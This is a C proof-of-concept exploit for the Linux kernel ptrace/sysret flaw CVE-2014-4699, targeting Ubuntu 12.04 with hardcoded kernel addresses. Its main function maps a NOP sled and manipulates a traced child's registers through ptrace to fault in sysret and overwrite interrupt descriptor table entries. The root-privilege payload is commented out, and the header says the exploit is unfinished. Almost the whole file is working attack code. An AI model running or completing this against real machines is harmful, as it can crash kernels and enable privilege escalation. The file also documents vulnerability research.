/**
 * CVE-2014-4699 ptrace/sysret PoC
 * by Vitaly Nikolenko
 * vnik@hashcrack.org
 *
 * > gcc -O2 poc_v0.c
 *
 * This code is kernel specific. On Ubuntu 12.04.0 LTS (3.2.0-23-generic), the
 * following will trigger the #GP in sysret and overwrite the #PF handler so we
 * can land to our NOP sled mapped at 0x80000000.
 * However, once landed, the IDT will be trashed. We can either attempt to
 * restore it (then escalate privileges and execute our shellcode) or find
 * something else to overwrite that would transfer exec flow to our controlled
 * user-space address. Since 3.10.something, IDT is read-only anyway. If you
 * have any ideas, let me know.
 */

#include <stdio.h>
#include <stdint.h>
#include <assert.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/user.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>

#define SIZE  0x10000000

typedef int __attribute__((regparm(3))) (*commit_creds_fn)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(unsigned long cred);

unsigned long __user_cs;
unsigned long __user_ss;
unsigned long __user_rflags;

void __attribute__((regparm(3))) payload() {
	uint32_t *fixptr = (void*)0xffffffff81dd70e8;
	// restore the #PF handler
	*fixptr = -1;
	//commit_creds_fn commit_creds = (commit_creds_fn)0xffffffff81091630;
	//prepare_kernel_cred_fn prepare_kernel_cred = (prepare_kernel_cred_fn)0xffffffff810918e0;
	//commit_creds(prepare_kernel_cred((uint64_t)NULL));

	//__asm__ volatile ("swapgs\n\t"
	//		  "...");
}

int main() {
	struct user_regs_struct regs;
	uint8_t *trampoline, *tmp;
	int status;

	struct {
		uint16_t limit;
		uint64_t addr;
	} __attribute__((packed)) idt;

        // MAP_POPULATE so we don't trigger extra #PF
	trampoline = mmap(0x80000000, SIZE, 7|PROT_EXEC|PROT_READ|PROT_WRITE, 0x32|MAP_FIXED|MAP_POPULATE|MAP_GROWSDOWN, 0,0);
	assert(trampoline == 0x80000000);
	memset(trampoline, 0x90, SIZE);
        tmp = trampoline;
        tmp += SIZE-1024;
        memcpy(tmp, &payload, 1024);
	memcpy(tmp-13,"\x0f\x01\xf8\xe8\5\0\0\0\x0f\x01\xf8\x48\xcf", 13);

	pid_t chld;

        if ((chld = fork()) < 0) {
		perror("fork");
		exit(1);
	}

	if (chld == 0) {
		if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
			perror("PTRACE_TRACEME");
			exit(1);
		}
		raise(SIGSTOP);
		fork();
		return 0;
	}

	asm volatile("sidt %0" : "=m" (idt));
	printf("IDT addr = 0x%lx\n", idt.addr);

	waitpid(chld, &status, 0);

	ptrace(PTRACE_SETOPTIONS, chld, 0, PTRACE_O_TRACEFORK);

	ptrace(PTRACE_CONT, chld, 0, 0);

	waitpid(chld, &status, 0);

        ptrace(PTRACE_GETREGS, chld, NULL, &regs);
	regs.rdi = 0x0000000000000000;
	regs.rip = 0x8fffffffffffffff;
	regs.rsp = idt.addr + 14*16 + 8 + 0xb0 - 0x78;

	// attempt to restore the IDT
	regs.rdi = 0x0000000000000000;
	regs.rsi = 0x81658e000010cbd0;
	regs.rdx = 0x00000000ffffffff;
	regs.rcx = 0x81658e000010cba0;
	regs.rax = 0x00000000ffffffff;
	regs.r8  = 0x81658e010010cb00;
	regs.r9  = 0x00000000ffffffff;
	regs.r10 = 0x81668e0000106b10;
	regs.r11 = 0x00000000ffffffff;
	regs.rbx = 0x81668e0000106ac0;
	regs.rbp = 0x00000000ffffffff;
	regs.r12 = 0x81668e0000106ac0;
	regs.r13 = 0x00000000ffffffff;
	regs.r14 = 0x81668e0200106a90;
	regs.r15 = 0x00000000ffffffff;

        ptrace(PTRACE_SETREGS, chld, NULL, &regs);

	ptrace(PTRACE_CONT, chld, 0, 0);

	ptrace(PTRACE_DETACH, chld, 0, 0);
}